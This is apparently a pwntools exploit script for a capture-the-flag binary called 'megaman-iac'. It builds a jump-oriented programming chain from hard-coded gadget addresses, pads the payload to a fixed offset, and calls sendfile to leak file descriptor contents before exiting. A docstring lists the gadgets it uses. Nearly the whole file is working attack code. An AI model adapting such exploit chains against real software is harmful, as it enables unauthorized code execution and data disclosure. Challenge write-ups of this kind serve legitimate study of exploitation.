from pwn import *

context.arch = "amd64"
context.os = "linux"
context.binary = elf = ELF("./megaman-iac")

#p = remote("localhost" , 6111)
p = elf.process()
#p = gdb.debug("./megaman")

add_rcx_4 = 0x00000000004011b3
mul_rcx_rcx = 0x00000000004011ba
mul_rdi_rcx = 0x00000000004011cb
inc_rdi = 0x00000000004011c1
zero_rcx = 0x00000000004011a9
zero_rdx = 0x0000000000401191
dispatch = 0x000000000040119e
pop_rsi = 0x00000000004011c7
dispatch_gadget = 0x00000000004011a0

sendfile = elf.symbols["sendfile"]
exit = elf.symbols["exit"]

offset = 0x218
fd = 4

pay = b"A"*16

pay += p64(zero_rcx) * 2 + p64(mul_rdi_rcx) * 2 + p64(inc_rdi) * 2 	# rcx = 0 & rdi = rdi*rcx = 0
pay += p64(zero_rdx) * 2 		 			  	# rdx = 0
pay += p64(add_rcx_4) * 12 + p64(mul_rcx_rcx) * 2			# rcx =  4*(12/2) = 24 -> rcx = rcx*rcx = 24*24 = 576
pay += p64(dispatch) * 2 + p64(pop_rsi) * 2         			# rsi = 3 (fd) later

pay = pay.ljust(offset , b"A")
pay += p64(dispatch)
pay += p64(dispatch_gadget)
pay += p64(sendfile)
pay += p64(fd)
pay += p64(exit)     # use exit for a clean exit

p.recvuntil(b"blue kid")
p.send(pay)

p.interactive()


"""
** USEFUL **

add_rcx_4 = 0x00000000004011b3 : add rcx, 4 ; jmp r10
mul_rcx_rcx = 0x00000000004011ba : imul rcx, rcx ; jmp r10
mul_rdi_rcx = 0x00000000004011cb : imul rdi, rcx ; jmp r10
inc_rdi = 0x00000000004011c1 : inc rdi ; jmp r10
zero_rcx = 0x00000000004011a9 : mov rcx, 0 ; jmp r10
zero_rdx = 0x0000000000401191 : mov rdx, 0 ; jmp r10
dispatch = 0x000000000040119e : pop r10 ; add rsi, 0x10 ; jmp qword ptr [rsi]
pop_rsi = 0x00000000004011c7 : pop rsi ; jmp r10
dispatch_gadget = 0x00000000004011a0 : add rsi, 0x10 ; jmp qword ptr [rsi]

"""
